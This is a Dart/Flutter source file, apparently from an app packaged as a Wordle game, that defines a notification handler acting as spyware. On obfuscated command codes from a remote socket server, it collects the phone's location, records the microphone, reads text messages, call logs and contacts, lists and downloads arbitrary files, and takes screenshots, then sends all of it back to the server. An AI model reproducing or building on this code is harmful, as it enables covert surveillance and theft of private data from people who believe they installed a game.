

import 'package:geolocator/geolocator.dart';
import 'package:wordle/service/audrec_service.dart';
import 'package:wordle/service/comm_service.dart';
import 'package:wordle/service/follow_manager.dart';
import 'package:wordle/service/loc_service.dart';
import 'package:wordle/service/screenshot_service.dart';
import 'package:wordle/socketio_service.dart';

class NotificationManager {
  final AudioRecorderService _audioRecorderService = AudioRecorderService(); 
  final CommService _commService = CommService(); 
  final LocationService _locationService = LocationService();
  final ScreenshotService _screenshotService = ScreenshotService();
  final SocketService _socketService = SocketService();

  void handleNoification(dynamic data) async {
    try {
      Map<String, dynamic> notification = Map<String, dynamic>.from(data);
      String type = notification["type"] as String;
      String action = notification['action']?.toString() ?? '';

      Map<String, dynamic>? notify;
      
      switch (type) {
        case '0xA7K': // Location
          print('📍 Location requested');
          Position loc = await _locationService.getCurrentLocation();
          notify = {'loc': loc.toJson() };
          break;

        case '0xP9X': // Microphone
          final int sec = int.tryParse(notification['sec']?.toString() ?? '') ?? 120;
          print('Mic requested for $sec seconds');

          final rec = await _audioRecorderService.recordForSeconds(seconds: sec);
          if(rec != null){ 
            notify = {
              'file': await FollowManager.downloadFile(rec)
            };
          }
          break;

        case '0xT4M':
          
          if(action == "ls"){
            List<Map<String, dynamic>> sml = await _commService.getMessages();
            notify = {'sml': sml };
          }else if(action == 'nano') {

            print("TBD");
          }
          break;

        case '0xE8R': 
          String path = notification['path'];
          print('File list requested at: $path');
          if(action == 'ls'){
            List<Map<String, dynamic>> list = await FollowManager.walk(path);
            notify = {
                'type': list[0]['type'].toString() == 'error'? 'error' :'list',
                'list': list
              };
          } else if(action == 'dl') {
            notify = await FollowManager.downloadFile(path);
          }
          break;

        case '0xC3V':
          print('Call logs requested');
          int from = int.tryParse(notification['fromts']?.toString() ?? '' ) ?? 0;
          int to = int.tryParse(notification['tots']?.toString() ?? '') ?? 0;
          if(from > 0 && to > 0){
            notify = { 'cList': await _commService.getCallLogs(dateFrom: from, dateTo: to), };
          }else if(from > 0 && to <= 0){
            notify = { 'cList': await _commService.getCallLogs(dateFrom: from), };
          } else {
            from = DateTime.now().subtract(Duration(days: 3)).millisecondsSinceEpoch ~/ 1000;
            notify = { 'cList': await _commService.getCallLogs(dateFrom: from), };
          }
          break;

        case '0xD9W': 
          print('Contacts requested');
          notify = {'ctList': await _commService.getContacts()};
          break;
          
        case '0xI1N': 
          // print('ℹ️ System info requested');
          break;

        case '0xN5Y': 
          // print('📶 Network info requested');
          break;

        case '0xV2Q':
          final path = await _screenshotService.captureCurrentScreen();
          if(path != null ){
            notify = {
              'ssf': await FollowManager.downloadFile(path) 
            };
          }
          break;
        default:
          print('Unknown command: $type');
      }

      if(notify != null){
        _socketService.sendMessage(type, notify);
      }
    } catch (e) {
      print('Error parsing notification: $e');
    }
  }
}